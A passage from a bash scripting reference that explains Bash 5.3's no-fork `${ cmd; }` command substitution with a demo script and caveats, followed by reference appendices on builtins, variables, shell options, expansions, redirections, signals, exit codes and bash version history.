`cmd` in a subshell — `fork(2)`, then run, then collect stdout. The
new `${ cmd; }` form runs `cmd` *in the current shell* and captures
its stdout as the value of the substitution. No fork, ~1 ms saved per
call on a modern Linux host, and — because there is no subshell —
variable assignments and other side effects persist into the parent.

The syntax requires:

- a **leading space** after `${` (distinguishing it from `${var…}`);
- a **trailing semicolon or newline** before the closing `}`;
- the body is parsed and executed as if it were a `{ … ; }` group.

### A worked side-effect-persistence demo

The clearest illustration is to run the same body under `$(…)` and
`${ …; }` and watch what happens to the parent's variables:

```bash
#!/usr/bin/env bash
# Requires bash 5.3+.
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

if (( BASH_VERSINFO[0] < 5 || (BASH_VERSINFO[0] == 5 && BASH_VERSINFO[1] < 3) )); then
  printf 'requires bash 5.3+\n' >&2; exit 18
fi

x=outer

# Traditional $() — runs in a subshell, side effects are discarded.
out1=$(x=inner; echo "$x")
printf 'after $(): out1=%s, x=%s\n' "$out1" "$x"
# ⇒ after $(): out1=inner, x=outer

# New ${ ; } — runs in the current shell, side effects persist.
out2=${ x=inner; echo "$x"; }
printf 'after ${ }: out2=%s, x=%s\n' "$out2" "$x"
# ⇒ after ${ }: out2=inner, x=inner
```

Both forms produce the same captured value (`inner`); the difference
is in the parent's `x`. Under `$(…)`, the parent never sees the inner
assignment — that is the whole point of subshell isolation. Under
`${ …; }`, the assignment lands in the parent's variable table,
because there is no subshell to isolate it.

### When to use it

The honest answer is: in 99% of scripts, **don't bother**. The 1 ms
saved per call is invisible against any real workload, and the
side-effect-persistence semantics is a footgun: a function that you
mentally model as "captures stdout, has no other effect" can suddenly
mutate the calling scope. `$(…)` is the safer default precisely
because of its isolation.

The exceptions worth the upgrade:

1. **Hot loops.** A polling loop that calls a tiny helper 10 000 times
   per minute is ~10 s of pure fork overhead with `$(…)`; ~0 with
   `${ …; }`. Build, deployment, and CI scripts with thousands of
   trivial substitutions are the canonical wins.
2. **Functions whose entire purpose is to return a value via stdout
   AND set a variable in the caller.** `${ …; }` lets you do both at
   once, which `$(…)` cannot.
3. **Scripts that already commit to bash 5.3+.** If the floor is 5.3,
   reach for the new form; if it is anything older, the
   forward-compatibility cost is not worth the per-call savings.

### Caveats

- **Not portable.** Requires bash 5.3 or later. The form is a *syntax
  error* on bash 5.2 and below — it cannot be feature-detected at
  runtime in the same script.
- **Side-effect persistence is the feature, not a bug.** Code that
  treats `${ …; }` as a drop-in replacement for `$(…)` will produce
  parent-scope mutations the author did not intend.
- **Whitespace is significant.** `${cmd;}` (no leading space) is still
  parameter expansion; `${ cmd;}` requires the space; the trailing
  `;` or newline before `}` is mandatory.

```bash
# wrong — no leading space; bash treats this as ${cmd;}
result=${cmd; echo hi; }
# ⇒ syntax error or attempt to expand a parameter named "cmd; echo hi; "

# right — leading space, trailing semicolon
result=${ cmd; echo hi; }
```

**See also**: §13.4 (command substitution — the `$(…)` form); §24.8
(subshell forking — what `$(…)` is doing under the covers); §25.5
(forward-compatibility considerations); Appendix M (bash version
history) for the 5.3 release notes.

## 25.2 Other Bash 5.3 additions

Other notable changes.

- New shopt and set options (consult Bash 5.3 NEWS).
- Refinements to `coproc` for multiple coprocs.
- Improvements to `wait -n` semantics.
- Performance improvements to common builtins.
- Bug fixes for edge cases in 5.2's bison grammar.

## 25.3 Release cadence

Bash major releases are infrequent; minor releases more common.

- 4.0 (2009) → 5.0 (2019) — ten years.
- 5.0 → 5.1 (2020) → 5.2 (2022) → 5.3 (2025) — roughly two years between minors.
- Patch releases: as needed for security.
- Distribution lag: Ubuntu LTS may carry the version current at LTS release for years.

## 25.4 Roadmap signals

Where bash development is heading, based on mailing-list activity and upstream patches.

- Continued performance work on hot paths (no-fork patterns).
- Better handling of UTF-8 in pattern matching.
- More flexible `printf` / `read` options.
- Refinements to `coproc`, `wait`, completion.
- Slow but steady — bash is a stable language; revolutionary changes are unlikely.
- Watch the bug-bash mailing list (`https://lists.gnu.org/archive/html/bug-bash/`).

## 25.5 Forward-compatibility considerations

Writing bash that will benefit from future versions without breaking.

- Avoid relying on undocumented behaviour.
- Watch deprecation notices in NEWS.
- Use modern idioms (no backticks, no `[ ]`, no `expr`).
- Pin bash version requirements in script headers.
- Test against new bash versions when they ship.

---

# Appendices

## Appendix A — Builtin Reference (alphabetical)

Every builtin in alphabetical order, with one-line description and option summary. Cross-referenced to the relevant chapter.

- `:` — null command (§7.14).
- `.`, `source` — execute file in current shell (§10.1).
- `alias`, `unalias` — define/remove command aliases.
- `bg`, `fg`, `jobs` — job control (§11.9).
- `bind` — readline key binding (§18.3).
- `break`, `continue` — loop control (§7.11).
- `builtin` — invoke a builtin even if shadowed.
- `caller` — call-stack frame (§9.11).
- `cd` — change directory.
- `command` — invoke a command bypassing functions and aliases.
- `compgen`, `complete`, `compopt` — programmable completion (§18.8).
- `coproc` — start a coprocess (§17.1).
- `declare`, `typeset` — variable declaration with attributes (§4.5).
- `dirs`, `pushd`, `popd` — directory stack.
- `disown` — remove from job table (§11.9).
- `echo` — print arguments (avoid; use `printf`, §14.5).
- `enable` — enable/disable builtins.
- `eval` — re-evaluate as shell input (§20.4).
- `exec` — replace shell or modify fds (§6.12).
- `exit` — terminate shell (§7.13).
- `export` — mark variable for export (§4.8).
- `false` — return failure (§7.14).
- `getopts` — POSIX option parser (§15.2).
- `hash` — command path memoisation.
- `help` — built-in help.
- `history` — history operations (§18.6).
- `kill` — send signal (§11.10).
- `let` — arithmetic evaluation (§8.13).
- `local` — declare function-local variable (§4.6).
- `logout` — exit a login shell.
- `mapfile`, `readarray` — read into array (§14.3).
- `printf` — formatted output (§14.4).
- `pwd` — print working directory.
- `read` — read input (§14.2).
- `readonly` — mark variable readonly (§4.7).
- `return` — return from function or sourced script (§7.12).
- `select` — interactive menu (§7.7).
- `set` — set shell options (Appendix D).
- `shift` — shift positional parameters.
- `shopt` — shell option (Appendix E).
- `suspend` — suspend the shell.
- `test`, `[` — POSIX conditional (§8.14, deprecated).
- `times` — print accumulated CPU times.
- `trap` — register signal handler (§12.5).
- `true` — return success (§7.14).
- `type` — show command type.
- `ulimit` — resource limits.
- `umask` — file-creation mode mask.
- `unset` — remove variable or function (§4.14).
- `wait` — wait for child completion (§16.2).

## Appendix B — Special Parameters Reference

| Parameter | Meaning |
|-----------|---------|
| `$0` | Script name (or `BASH_ARGV0`) |
| `$1`–`${N}` | Positional parameters |
| `$#` | Number of positional parameters |
| `$@` | All positional, each a separate word when quoted |
| `$*` | All positional, joined by IFS[0] when quoted |
| `$?` | Exit status of last foreground command |
| `$$` | PID of script (fixed; not subshell PID) |
| `$!` | PID of last backgrounded process |
| `$_` | Last argument of previous command |
| `$-` | Current shell flags |

## Appendix C — Shell Variables Reference

Bash-defined variables in tabular form. Pinned to bash 5.2.21; selection
biased toward variables a script-author actually reaches for. See
`man bash` for the full list.

**Type** abbreviations: `s` = scalar string; `i` = integer; `a[]` =
indexed array; `A[]` = associative array. **Scope**: `RO` = read-only
(set by bash, attempt to assign is rejected); `RW` = user-writable;
`env` = inherited from / exported to environment.

### Process and version identity

| Name | Type | Scope | Description |
|------|------|-------|-------------|
| `BASH` | s | RO | Full path to the bash binary executing the script. |
| `BASH_VERSION` | s | RO | Version string, e.g. `5.2.21(1)-release`. |
| `BASH_VERSINFO` | a[] | RO | 6-element array: major, minor, patch, build, release-status, machine. |
| `BASH_SUBSHELL` | i | RO | Subshell nesting depth; 0 in top-level shell, increments per `(…)`. |
| `BASHPID` | i | RO | PID of the current bash process (subshell-aware, unlike `$$`). |
| `SHLVL` | i | env | Number of shell invocations deep — increments per nested `bash` call. |
| `UID` | i | RO | Real user ID. |
| `EUID` | i | RO | Effective user ID. |
| `GROUPS` | a[] | RO | Groups the current user belongs to. |
| `HOSTNAME` | s | RO | Hostname (set at startup; may not track `hostname` changes). |
| `HOSTTYPE`, `MACHTYPE`, `OSTYPE` | s | RO | Build-time architecture / OS strings. |

### Call-stack introspection

| Name | Type | Scope | Description |
|------|------|-------|-------------|
| `BASH_SOURCE` | a[] | RO | Source file path of each frame in the call stack; `BASH_SOURCE[0]` is the current file. |
| `BASH_LINENO` | a[] | RO | Caller line number for each frame; `BASH_LINENO[i]` is the line in `BASH_SOURCE[i+1]` from which `BASH_SOURCE[i]` was called. |
| `FUNCNAME` | a[] | RO | Function name for each frame; `FUNCNAME[0]` is the current function. Empty/unset at top level. |
| `LINENO` | i | RO | Current line number in the executing script or function. |

### Pattern-match results

| Name | Type | Scope | Description |
|------|------|-------|-------------|
| `BASH_REMATCH` | a[] | RO | Captures from the most recent `[[ str =~ regex ]]` match; index 0 is whole match, 1+ are captured groups. |
| `MAPFILE` | a[] | RW | Default array name for `mapfile` / `readarray` when none supplied. |

### Shell options and history

| Name | Type | Scope | Description |
|------|------|-------|-------------|
| `BASHOPTS` | s | RO | Colon-separated list of currently-set `shopt` options. |
| `SHELLOPTS` | s | RO | Colon-separated list of currently-set `set -o` options. |
| `HISTFILE` | s | env | Path to history file (default `~/.bash_history`). |
| `HISTSIZE` | i | RW | Lines retained in-memory. |
| `HISTFILESIZE` | i | RW | Lines retained on disk. |
| `HISTCONTROL` | s | RW | Colon-separated: `ignoredups`, `ignorespace`, `ignoreboth`, `erasedups`. |
| `HISTIGNORE` | s | RW | Colon-separated patterns excluded from history. |
| `HISTTIMEFORMAT` | s | RW | `strftime` format for `history` output; empty disables timestamps. |

### Field separation, locale, prompts

| Name | Type | Scope | Description |
|------|------|-------|-------------|
| `IFS` | s | RW | Internal field separator; controls word-splitting (stage 4). Default: space, tab, newline. |
| `LANG` | s | env | Default locale; lower-priority than `LC_*`. |
| `LC_ALL`, `LC_CTYPE`, `LC_COLLATE`, `LC_NUMERIC`, `LC_MESSAGES`, `LC_TIME` | s | env | Per-category locale overrides. |
| `LANGUAGE` | s | env | GNU gettext message-catalogue priority list. |
| `PS0` | s | RW | Printed *after* command read but before execution (5.0+). |
| `PS1` | s | RW | Primary interactive prompt. |
| `PS2` | s | RW | Continuation prompt. |
| `PS3` | s | RW | `select` builtin prompt. |
| `PS4` | s | RW | `set -x` trace prefix; default `'+ '`. |
| `PROMPT_COMMAND` | s/a[] | RW | Command(s) executed before each `PS1` print. Array form (5.1+) runs each element. |
| `PROMPT_DIRTRIM` | i | RW | Truncate `\w` / `\W` prompt expansion to N trailing components. |

### Time and randomness

| Name | Type | Scope | Description |
|------|------|-------|-------------|
| `EPOCHSECONDS` | i | RO | Seconds since 1970-01-01 UTC (5.0+). |
| `EPOCHREALTIME` | s | RO | Seconds since epoch with microsecond fractional part (5.0+). |
| `SECONDS` | i | RW | Seconds since shell start (or since assigned value). |
| `TIMEFORMAT` | s | RW | Format string for the `time` reserved word's output. |
| `RANDOM` | i | RO | New 16-bit pseudo-random integer per read (0–32767). |
| `SRANDOM` | i | RO | New 32-bit cryptographically-strong random per read (5.1+). |

### Filesystem context

| Name | Type | Scope | Description |
|------|------|-------|-------------|
| `PWD` | s | env | Current working directory. |
| `OLDPWD` | s | env | Previous working directory; set by `cd`. |
| `PATH` | s | env | Colon-separated command search list. |
| `CDPATH` | s | env | Search path for `cd` (rare; use with care under `set -u`). |

### `getopts` and completion state

| Name | Type | Scope | Description |
|------|------|-------|-------------|
| `OPTARG` | s | RW | Argument captured by `getopts` for an option that takes one. |
| `OPTIND` | i | RW | Index of the next argument `getopts` will process; reset to 1 between parses. |
| `COMP_LINE` | s | RW | Current command line being completed. |
| `COMP_POINT` | i | RW | Cursor position within `COMP_LINE`. |
| `COMP_WORDS` | a[] | RW | Words on the line being completed. |
| `COMP_CWORD` | i | RW | Index into `COMP_WORDS` of the word containing the cursor. |
| `COMPREPLY` | a[] | RW | Completions to offer; populated by completion functions. |

### Pipeline and function-recursion limits

| Name | Type | Scope | Description |
|------|------|-------|-------------|
| `PIPESTATUS` | a[] | RO | Exit statuses of each command in the most recent pipeline; rightmost element corresponds to the last stage. |
| `FUNCNEST` | i | RW | Maximum function-call nesting; 0 means unlimited. Useful as a recursion guard. |

### Readline

| Name | Type | Scope | Description |
|------|------|-------|-------------|
| `READLINE_LINE` | s | RW | Current readline buffer (inside readline-bound functions). |
| `READLINE_POINT` | i | RW | Cursor position in `READLINE_LINE`. |
| `READLINE_MARK` | i | RW | Mark position (5.1+). |
| `READLINE_ARGUMENT` | s | RW | Numeric argument given to a readline command (5.0+). |

`BASH_REMATCH` is set by `[[ str =~ regex ]]` matches. `MAPFILE` is the
default target of `mapfile`/`readarray`. `BASH_SUBSHELL` and `BASHPID`
are the canonical "am I in a subshell?" probes (§24.8). `EPOCHREALTIME`
replaces the older `date +%s.%N`-via-command-substitution idiom.

POSIX-mode-only variables (`POSIXLY_CORRECT`) are deliberately omitted —
BCS-aligned scripts do not enable POSIX mode.

**See also**: Appendix B (special parameters: `$0`–`$9`, `$@`, `$*`,
`$#`, `$$`, `$!`, `$?`, `$_`, `$-`); Appendix D (`set` options);
Appendix E (`shopt` options); §12 (parameters) for the full grammar of
parameter expansion.

## Appendix D — `set` Options Reference

| Short | Long | Effect |
|-------|------|--------|
| `-a` | `allexport` | Export all newly-defined variables |
| `-b` | `notify` | Notify of background-job completion |
| `-e` | `errexit` | Exit on error (§13.2) |
| `-f` | `noglob` | Disable pathname expansion |
| `-h` | `hashall` | Hash command paths |
| `-k` | `keyword` | Keyword args anywhere on line |
| `-m` | `monitor` | Job control |
| `-n` | `noexec` | Read but don't execute |
| `-p` | `privileged` | Don't read profile/rc |
| `-t` | `onecmd` | Exit after one command |
| `-u` | `nounset` | Error on unset variable (§13.4) |
| `-v` | `verbose` | Print input lines |
| `-x` | `xtrace` | Print commands as executed |
| `-B` | `braceexpand` | Brace expansion (default on) |
| `-C` | `noclobber` | Don't overwrite with `>` (§20.10) |
| `-E` | `errtrace` | ERR trap inherited (§13.9) |
| `-H` | `histexpand` | History expansion (default on, interactive) |
| `-P` | `physical` | Don't follow symlinks for `cd` |
| `-T` | `functrace` | DEBUG/RETURN traps inherited |
| | `pipefail` | Pipeline status (§6.15) |
| | `posix` | POSIX mode |

## Appendix E — `shopt` Options Reference

Selected `shopt` options for bash 5.2; the full list is `shopt` with no
arguments. **Default** column shows the option's state in a fresh
bash 5.2 invocation: `on` enabled at startup, `off` disabled, `int`
enabled only in interactive shells. **Since** indicates the bash version
that introduced the option (4.0 unless older). BCS-recommended options
are flagged in the description.

### BCS-mandated set (always enable)

| Option | Default | Since | Description |
|--------|---------|-------|-------------|
| `inherit_errexit` | off | 4.4 | Propagate `set -e` into command substitutions. **BCS0101 mandatory** — without it, `$( … )` silently swallows errors. |
| `extglob` | off | 2.02 | Enable extended glob patterns (`?(…)`, `*(…)`, `+(…)`, `@(…)`, `!(…)`). **BCS preamble** — required by §5.12. |
| `nullglob` | off | 2.02 | Unmatched globs expand to nothing instead of literal pattern. **BCS preamble** — pairs with `for f in *.log; do …` loops. |
| `shift_verbose` | off | 2.0  | Warn on shift past end of positional parameters. *Removed from BCS preamble in §13.6 retrospective*; still useful in template guidance. |

### Globbing behaviour

| Option | Default | Since | Description |
|--------|---------|-------|-------------|
| `dotglob` | off | 2.0 | Include dotfiles (except `.` and `..`) in `*` expansion. (§5.11) |
| `failglob` | off | 3.0 | Unmatched glob is an error (mutually exclusive with `nullglob`). |
| `globasciiranges` | off | 4.3 | `[a-z]` matches ASCII regardless of locale; otherwise locale-dependent. |
| `globskipdots` | on  | 5.2 | Exclude `.` and `..` from `*` even when `dotglob` is set. **5.2 default-on**. |
| `globstar` | off | 4.0 | `**` matches any number of directories recursively. |
| `nocaseglob` | off | 2.02 | Case-insensitive glob matching. (§5.11) |
| `nocasematch` | off | 3.1 | Case-insensitive `[[ … = pat ]]` and `case` matching. |

### History and interactive features

| Option | Default | Since | Description |
|--------|---------|-------|-------------|
| `cmdhist` | int | 2.0 | Save multi-line commands as one history entry. |
| `lithist` | off | 2.0 | Save multi-line commands with embedded newlines (vs `;`). |
| `histappend` | off | 2.0 | Append to `HISTFILE` instead of overwriting. |
| `histreedit` | off | 2.0 | Re-edit a failed history substitution. |
| `histverify` | off | 2.0 | Show expanded history before executing. |
| `huponexit` | off | 2.02 | Send SIGHUP to background jobs on shell exit. |
| `interactive_comments` | int | 1.14.7 | `#` introduces comments in interactive shell. |
| `mailwarn` | off | 2.0 | Warn when mail file is read and modified. |
| `no_empty_cmd_completion` | off | 2.04 | Don't tab-complete on an empty line. |
| `progcomp` | on  | 2.04 | Enable programmable completion (the `complete` builtin). |
| `progcomp_alias` | off | 4.4 | Aliases participate in programmable completion. |
| `promptvars` | on  | 2.0 | Expand variables and `\…` escapes in prompt strings. |
| `restricted_shell` | off | 3.0 | Read-only — set when bash is invoked as `rbash`. |

### Directory and command lookup

| Option | Default | Since | Description |
|--------|---------|-------|-------------|
| `autocd` | off | 4.0 | Bare directory name acts as `cd dir`. |
| `cdable_vars` | off | 2.0 | `cd VAR` resolves to `cd $VAR` if VAR names a directory. |
| `cdspell` | off | 2.0 | Autocorrect minor `cd` typos (interactive). |
| `dirspell` | off | 4.0 | Autocorrect directory names during completion. |
| `checkhash` | off | 2.0 | Verify hashed commands still exist before invoking. |
| `checkjobs` | off | 4.0 | Warn before exiting with stopped/running jobs. |
| `checkwinsize` | on  | 2.05 | Update `LINES`/`COLUMNS` after each command. |
| `direxpand` | off | 4.3 | Path completion replaces with expanded path. |
| `complete_fullquote` | on  | 4.3 | Quote shell metacharacters in completion output. |

### Function and variable behaviour

| Option | Default | Since | Description |
|--------|---------|-------|-------------|
| `expand_aliases` | off | 1.14.7 | Aliases expand in non-interactive shells. |
| `extdebug` | off | 3.0 | Enable extended debugging (`declare -F` shows source/lineno; `BASH_ARG{C,V}` populated; ERR trap inheritance). |
| `lastpipe` | off | 4.2 | Last pipeline command runs in current shell, not subshell. (§6.16) |
| `localvar_inherit` | off | 4.4 | `local` inherits parent function's value when re-declared. |
| `localvar_unset` | off | 4.4 | `local` initialises to "unset" rather than empty. |
| `varredir_close` | off | 5.2 | `{var}<file` closes fd when var goes out of scope. **5.2-new**. |
| `assoc_expand_once` | off | 5.0 | Associative subscripts expanded once (5.0+) — performance/safety. |

### Interaction with `set -e` and signals

| Option | Default | Since | Description |
|--------|---------|-------|-------------|
| `inherit_errexit` | off | 4.4 | (Listed above.) **BCS-mandated**. |
| `execfail` | off | 2.0 | Non-interactive shell continues on `exec` failure instead of exiting. |
| `gnu_errfmt` | off | 2.05 | Error messages in GNU `file:line: message` format. |

### Sourcing

| Option | Default | Since | Description |
|--------|---------|-------|-------------|
| `sourcepath` | on  | 2.0 | `source`/`.` searches `PATH` for the script. |

### Compatibility levels (do not enable)

`compat31` through `compat51` revert specific behaviours to older bash
versions. **BCS recommends not enabling any of them**: they widen the
surface for subtle bugs, and modern bash 5.2 already provides all
documented behaviour. See §23.9 for the full discussion. Listed for
completeness; treat as deprecated.

| Option | Default | Since | Description |
|--------|---------|-------|-------------|
| `compat31` | off | 4.0 | Restore bash 3.1 quoting/regex behaviour. |
| `compat32` | off | 4.1 | Restore bash 3.2 behaviour. |
| `compat40` | off | 4.1 | Restore bash 4.0 behaviour. |
| `compat41` | off | 4.2 | Restore bash 4.1 behaviour. |
| `compat42` | off | 4.3 | Restore bash 4.2 behaviour. |
| `compat43` | off | 4.4 | Restore bash 4.3 behaviour. |
| `compat44` | off | 5.0 | Restore bash 4.4 behaviour. |
| `compat50` | off | 5.1 | Restore bash 5.0 behaviour. |
| `compat51` | off | 5.2 | Restore bash 5.1 behaviour. |

### Miscellaneous

| Option | Default | Since | Description |
|--------|---------|-------|-------------|
| `xpg_echo` | off | 2.04 | `echo` interprets `\…` escapes by default (POSIX/SUS behaviour). |
| `force_fignore` | on  | 3.0 | Apply `FIGNORE` even when the only candidate would be ignored. |
| `patsub_replacement` | on  | 5.2 | `&` in `${var/pat/repl}` expands to matched text. **5.2-new**. |
| `xpg_echo` | off | 2.04 | (Duplicate row removed in source; see above.) |

The two BCS-canonical preamble lines:

```bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob
```

cover the four mandatory options. Additional `shopt -s` lines for
`globstar`, `nocaseglob`, etc. are situational and should appear in
the script header where used.

**See also**: Appendix D (`set -o` options); §13.6 (the full BCS
strict-mode discussion); §23.9 (compatibility levels and why to avoid
them); BCS0101 (strict mode mandate); BCS0102 (shebang).

## Appendix F — ANSI-C Escape Sequences

| Escape | Character |
|--------|-----------|
| `\a` | Alert (BEL, 0x07) |
| `\b` | Backspace (0x08) |
| `\e`, `\E` | Escape (0x1b) |
| `\f` | Form feed (0x0c) |
| `\n` | Newline (0x0a) |
| `\r` | Carriage return (0x0d) |
| `\t` | Horizontal tab (0x09) |
| `\v` | Vertical tab (0x0b) |
| `\\` | Backslash |
| `\'` | Single quote |
| `\"` | Double quote |
| `\?` | Question mark |
| `\nnn` | Octal value (1–3 digits) |
| `\xHH` | Hex value (1–2 digits) |
| `\uHHHH` | Unicode (4 hex) |
| `\UHHHHHHHH` | Unicode (8 hex) |
| `\cX` | Control-X |

## Appendix G — Glob and Extglob Patterns

| Pattern | Matches |
|---------|---------|
| `*` | Zero or more characters |
| `?` | Exactly one character |
| `[abc]` | Any of a, b, c |
| `[a-z]` | Any character in range |
| `[!abc]`, `[^abc]` | Any except a, b, c |
| `[[:class:]]` | POSIX character class |
| `**` | Zero or more directories (with `globstar`) |
| `?(pat\|pat)` | Zero or one occurrence (extglob) |
| `*(pat\|pat)` | Zero or more occurrences (extglob) |
| `+(pat\|pat)` | One or more occurrences (extglob) |
| `@(pat\|pat)` | Exactly one occurrence (extglob) |
| `!(pat\|pat)` | Anything except (extglob) |

POSIX character classes: `alnum`, `alpha`, `ascii`, `blank`, `cntrl`, `digit`, `graph`, `lower`, `print`, `punct`, `space`, `upper`, `word`, `xdigit`.

## Appendix H — Conditional Expression Operators

For use inside `[[ ]]`.

**File tests (single operand):**

| Operator | True if |
|----------|---------|
| `-e file` | exists |
| `-f file` | regular file |
| `-d file` | directory |
| `-L file`, `-h file` | symlink |
| `-b file` | block device |
| `-c file` | character device |
| `-p file` | FIFO |
| `-S file` | socket |
| `-r file` | readable |
| `-w file` | writable |
| `-x file` | executable |
| `-s file` | non-zero size |
| `-N file` | modified since last read |
| `-O file` | owned by EUID |
| `-G file` | group owned by EGID |
| `-k file` | sticky bit |
| `-u file` | SUID bit |
| `-g file` | SGID bit |
| `-t fd` | fd is a terminal |

**File comparisons:**

| Operator | True if |
|----------|---------|
| `f1 -nt f2` | f1 newer than f2 |
| `f1 -ot f2` | f1 older than f2 |
| `f1 -ef f2` | same inode |

**String tests:**

| Operator | True if |
|----------|---------|
| `-z str` | empty |
| `-n str` | non-empty |
| `-v var` | variable set |
| `-R name` | name is a nameref |
| `s1 = s2`, `s1 == s2` | strings equal |
| `s1 != s2` | strings not equal |
| `s1 < s2` | s1 lexically less |
| `s1 > s2` | s1 lexically greater |
| `s == pattern` | glob match |
| `s =~ regex` | ERE match |

## Appendix I — Parameter Expansion Cheat Sheet

| Form | Effect |
|------|--------|
| `$var`, `${var}` | Value |
| `${var:-default}` | Default if unset/empty |
| `${var-default}` | Default if unset only |
| `${var:=default}` | Assign default; same usage |
| `${var=default}` | Assign default if unset only |
| `${var:?msg}` | Error if unset/empty |
| `${var?msg}` | Error if unset only |
| `${var:+alt}` | alt if set/non-empty |
| `${var+alt}` | alt if set only |
| `${var:offset}` | Substring from offset |
| `${var:offset:length}` | Substring of length |
| `${#var}` | Length |
| `${var#prefix}` | Remove shortest prefix |
| `${var##prefix}` | Remove longest prefix |
| `${var%suffix}` | Remove shortest suffix |
| `${var%%suffix}` | Remove longest suffix |
| `${var/old/new}` | Replace first |
| `${var//old/new}` | Replace all |
| `${var/#old/new}` | Replace if at start |
| `${var/%old/new}` | Replace if at end |
| `${var^}` | Uppercase first |
| `${var^^}` | Uppercase all |
| `${var,}` | Lowercase first |
| `${var,,}` | Lowercase all |
| `${!var}` | Indirect |
| `${!prefix*}`, `${!prefix@}` | Names matching prefix |
| `${!arr[@]}` | Array indices |
| `${var@Q}` | Quoted form |
| `${var@E}` | Escape-interpreted |
| `${var@P}` | Prompt-expanded |
| `${var@A}` | Assignment form |
| `${var@a}` | Attributes |
| `${var@K}`, `${var@k}` | Assoc-array form (5.2+) |
| `${var@U}`, `${var@u}`, `${var@L}` | Case forms |

## Appendix J — Redirection Operators

| Operator | Effect |
|----------|--------|
| `< file` | Open file for reading on fd 0 |
| `n< file` | Open on fd n |
| `> file` | Open for writing on fd 1, truncate |
| `>> file` | Append on fd 1 |
| `>\| file` | Force overwrite (ignore noclobber) |
| `&> file` | `> file 2>&1` shorthand |
| `&>> file` | `>> file 2>&1` shorthand |
| `<&n`, `n<&m` | Duplicate fds for reading |
| `>&n`, `n>&m` | Duplicate fds for writing |
| `<&-`, `>&-` | Close fd 0, fd 1 |
| `n<&-`, `n>&-` | Close fd n |
| `n<&m-`, `n>&m-` | Move fd m to n (close m) |
| `<> file` | Open for read+write |
| `<<DELIM` | Here-document |
| `<<-DELIM` | Here-document, strip leading tabs |
| `<<<"str"` | Here-string |
| `\| cmd` | Pipe stdout to cmd |
| `\|& cmd` | Pipe stdout+stderr to cmd |
| `<(cmd)` | Process substitution (read) |
| `>(cmd)` | Process substitution (write) |

## Appendix K — Signal Numbers (Linux)

Standard signals on Linux x86-64. Use `kill -l` for the authoritative local list.

| # | Name | Default action |
|---|------|----------------|
| 1 | HUP | Terminate |
| 2 | INT | Terminate |
| 3 | QUIT | Core dump |
| 4 | ILL | Core dump |
| 5 | TRAP | Core dump |
| 6 | ABRT | Core dump |
| 7 | BUS | Core dump |
| 8 | FPE | Core dump |
| 9 | KILL | Terminate (uncatchable) |
| 10 | USR1 | Terminate |
| 11 | SEGV | Core dump |
| 12 | USR2 | Terminate |
| 13 | PIPE | Terminate |
| 14 | ALRM | Terminate |
| 15 | TERM | Terminate |
| 16 | STKFLT | Terminate |
| 17 | CHLD | Ignore |
| 18 | CONT | Continue |
| 19 | STOP | Stop (uncatchable) |
| 20 | TSTP | Stop |
| 21 | TTIN | Stop |
| 22 | TTOU | Stop |
| 23 | URG | Ignore |
| 24 | XCPU | Core dump |
| 25 | XFSZ | Core dump |
| 26 | VTALRM | Terminate |
| 27 | PROF | Terminate |
| 28 | WINCH | Ignore |
| 29 | IO/POLL | Terminate |
| 30 | PWR | Terminate |
| 31 | SYS | Core dump |
| 34–64 | RTMIN..RTMAX | Terminate |

## Appendix L — Exit Code Conventions

| Code | Meaning |
|------|---------|
| 0 | Success |
| 1 | General error |
| 2 | Usage error |
| 3 | File not found |
| 5 | I/O error |
| 13 | Permission denied |
| 18 | Missing dependency |
| 22 | Invalid argument |
| 24 | Timeout |
| 64–113 | sysexits.h |
| 126 | Found but not executable |
| 127 | Command not found |
| 128 + N | Killed by signal N |

`sysexits.h`: 64=USAGE, 65=DATAERR, 66=NOINPUT, 67=NOUSER, 68=NOHOST, 69=UNAVAILABLE, 70=SOFTWARE, 71=OSERR, 72=OSFILE, 73=CANTCREAT, 74=IOERR, 75=TEMPFAIL, 76=PROTOCOL, 77=NOPERM, 78=CONFIG.

## Appendix M — Bash Version History

| Version | Year | Notable additions |
|---------|------|-------------------|
| 1.0 | 1989 | Initial release |
| 2.0 | 1996 | New parser; large rewrite |
| 3.0 | 2004 | `=~`, `+=`, multi-character `IFS` |
| 3.2 | 2006 | Bug fixes; macOS perpetual baseline |
| 4.0 | 2009 | Associative arrays, coprocesses, `mapfile`, `&>>`, `**`, `;&`/`;;&`, `read -i`, autocd |
| 4.1 | 2009 | `printf -v` for arrays, `BASH_XTRACEFD`, `&>` |
| 4.2 | 2011 | `declare -g`, `printf %(fmt)T`, `lastpipe` |
| 4.3 | 2014 | Namerefs (`declare -n`), `mapfile -d`, `wait -n` |
| 4.4 | 2016 | `${var@…}` transformations, `local -`, `inherit_errexit` |
| 5.0 | 2019 | `EPOCHSECONDS`, `EPOCHREALTIME`, `BASH_ARGV0`, history range delete |
| 5.1 | 2020 | `SRANDOM`, `wait -p`, `BASH_REMATCH` reset |
| 5.2 | 2022 | Recursive bison grammar for command substitution, `varredir_close`, `${var@k}`, `globskipdots`, `noexpand_translation` |
| 5.3 | 2025 | No-fork `${ cmd; }` command substitution, multi-coproc improvements |

## Appendix N — Glossary

- **alias** — string substitution at command position (vs function).
- **arithmetic context** — `(( ))` and `$(( ))`; integer-only.
- **array** — ordered (indexed) or keyed (associative) variable.
- **AND-OR list** — `cmd && cmd` or `cmd || cmd` short-circuit chain.
- **builtin** — command implemented inside bash, no fork.
- **brace expansion** — generative pattern `{a,b,c}` or `{1..N}`.
- **brace group** — `{ …; }` runs in current shell.
- **command substitution** — `$(cmd)` captures stdout.
- **compound command** — `if`, `case`, `while`, `for`, `select`, `(( ))`, `[[ ]]`, `( )`, `{ }`.
- **coproc** — process with bidirectional pipe to current shell.
- **dynamic scope** — function locals visible to callees (bash's model).
- **exec** — `execve(2)` or shell `exec` (replaces shell image).
- **expansion** — one of eight transformations bash applies to words.
- **fd** — file descriptor; integer index into kernel's open-files table.
- **FIFO** — named pipe; file-system-resident.
- **fork** — `fork(2)`; duplicates current process.
- **glob** — pathname expansion pattern.
- **here-document** — inline stdin via `<<DELIM`.
- **here-string** — inline stdin via `<<<`.
- **IFS** — internal field separator; controls word splitting.
- **inherit_errexit** — shopt that propagates `-e` into command substitutions.
- **job control** — bash's tracking of background jobs.
- **lastpipe** — shopt; runs last pipeline element in current shell.
- **list** — sequence of pipelines separated by `;`, `&`, `&&`, `||`, or newline.
- **local** — function-scoped variable; dynamic scope.
- **loadable** — externally-loadable builtin via `enable -f`.
- **nameref** — variable holding the name of another variable.
- **nullglob** — shopt; empty glob expands to nothing.
